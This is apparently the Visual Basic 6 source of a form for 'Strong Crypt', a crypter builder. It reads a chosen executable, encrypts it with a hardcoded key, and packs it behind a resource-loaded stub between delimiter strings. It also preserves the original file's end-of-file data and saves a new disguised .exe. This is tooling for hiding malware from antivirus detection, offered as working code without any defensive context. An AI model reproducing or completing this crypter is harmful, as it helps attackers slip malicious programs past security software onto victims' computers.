VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   BorderStyle     =   3  'Fester Dialog
   Caption         =   "Strong Crypt by Cryptable"
   ClientHeight    =   915
   ClientLeft      =   45
   ClientTop       =   405
   ClientWidth     =   6750
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   915
   ScaleWidth      =   6750
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
   Begin Projekt1.CandyButton CandyButton2 
      Height          =   255
      Left            =   6240
      TabIndex        =   2
      Top             =   120
      Width           =   375
      _ExtentX        =   661
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "..."
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin Projekt1.CandyButton CandyButton1 
      Height          =   375
      Left            =   120
      TabIndex        =   1
      Top             =   480
      Width           =   6495
      _ExtentX        =   11456
      _ExtentY        =   661
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Caption         =   "Crypt"
      IconHighLiteColor=   0
      CaptionHighLiteColor=   0
      Checked         =   0   'False
      ColorButtonHover=   16760976
      ColorButtonUp   =   15309136
      ColorButtonDown =   15309136
      BorderBrightness=   0
      ColorBright     =   16772528
      DisplayHand     =   0   'False
      ColorScheme     =   0
   End
   Begin VB.TextBox flatedit1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "C:\Windows\system32\calc.exe"
      Top             =   120
      Width           =   6015
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   0
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False


Public Function ReadEOFData(sFilePath As String) As String
On Error GoTo Err:
Dim sFileBuf As String, sEOFBuf As String, sChar As String
Dim lFF As Long, lPos As Long, lPos2 As Long, lCount As Long
If Dir(sFilePath) = "" Then GoTo Err:
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
lPos = InStr(1, StrReverse(sFileBuf), GetNullBytes(30))
sEOFBuf = (Mid(StrReverse(sFileBuf), 1, lPos - 1))
ReadEOFData = StrReverse(sEOFBuf)
Err:
ReadEOFData = vbNullString
End Function
Sub WriteEOFData(sFilePath As String, sEOFData As String)
Dim sFileBuf As String
Dim lFF As Long
On Error Resume Next
If Dir(sFilePath) = "" Then Exit Sub
lFF = FreeFile
Open sFilePath For Binary As #lFF
sFileBuf = Space(LOF(lFF))
Get #lFF, , sFileBuf
Close #lFF
Kill sFilePath
lFF = FreeFile
Open sFilePath For Binary As #lFF
Put #lFF, , sFileBuf & sEOFData
Close #lFF
End Sub
Public Function GetNullBytes(lNum) As String
Dim sBuf As String
Dim i As Integer
For i = 1 To lNum
sBuf = sBuf & Chr(0)
Next
GetNullBytes = sBuf
End Function

Private Sub CandyButton1_Click()
Dim Stub() As Byte
Dim Crypt As String
Dim EOF As String
Dim Splitc As String
Dim Decodec As String
Dim Crypted As String

Stub = LoadResData(101, "CUSTOM")

Open (flatedit1.Text) For Binary As #1
Crypt = Space(LOF(1))
Get #1, , Crypt
Close #1

EOF = ReadEOFData(flatedit1.Text)

Splitc = "65356g65/&/BtbN&967fn7/880GV(g=(c76fg(=gf80f80tt8t68R%78487e7)e759ed57e79r96r7rr/)r57er568/"
Decodec = "g=(c76fg(=gf80f80tt8t68R%78487e7)"

Crypted = strEncrypt(Crypt, Decodec)

Open (Environ$("TEMP") & "\Crypted.exe") For Binary As #1
Put #1, , Stub
Put #1, , Splitc
Put #1, , Crypted
Put #1, , Splitc
Close #1

Call WriteEOFData(Environ$("TEMP") & "\Crypted.exe", EOF)

With CommonDialog1

.ShowSave
.Filter = "Executables (*.exe)|*.exe"

FileCopy Environ$("TEMP") & "\Crypted.exe", .FileName

On Error Resume Next
Kill Environ$("TEMP") & "\Crypted.exe"

End With
End Sub

Private Sub CandyButton2_Click()
With CommonDialog1

.Filter = "Executables (*.exe)|*.exe"
.ShowOpen

flatedit1.Text = .FileName

End With
End Sub
